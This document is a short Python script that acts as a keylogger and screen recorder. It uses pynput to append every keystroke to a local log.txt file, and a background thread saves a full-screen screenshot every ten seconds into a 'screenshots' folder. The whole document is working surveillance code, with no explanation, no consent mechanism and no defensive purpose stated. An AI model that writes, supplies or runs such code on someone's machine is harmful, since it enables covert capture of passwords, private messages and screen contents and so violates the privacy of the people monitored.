import pynput

import time

import threading

import os

from PIL import ImageGrab

# Set the time interval to capture screenshots

TIME_INTERVAL = 10 # seconds

# Set the folder name to save the screenshots

FOLDER_NAME = "screenshots"

# Create the folder to save the screenshots

if not os.path.exists(FOLDER_NAME):

    os.mkdir(FOLDER_NAME)

# Define a function to capture the screenshots

def capture_screenshot():

    while True:

        # Get the current time as the screenshot file name

        file_name = time.strftime("%Y-%m-%d %H-%M-%S") + ".png"

        

        # Capture the screenshot and save it to the folder

        img = ImageGrab.grab()

        img.save(os.path.join(FOLDER_NAME, file_name))

        

        # Wait for the next time interval

        time.sleep(TIME_INTERVAL)

# Define a function to log the keystrokes

def on_press(key):

    with open("log.txt", "a") as f:

        f.write("{0} pressed\n".format(key))

# Create the listener for the keystrokes

listener = pynput.keyboard.Listener(on_press=on_press)

# Create the thread for capturing screenshots

screenshot_thread = threading.Thread(target=capture_screenshot)

screenshot_thread.start()

# Start the listener for the keystrokes

listener.start()

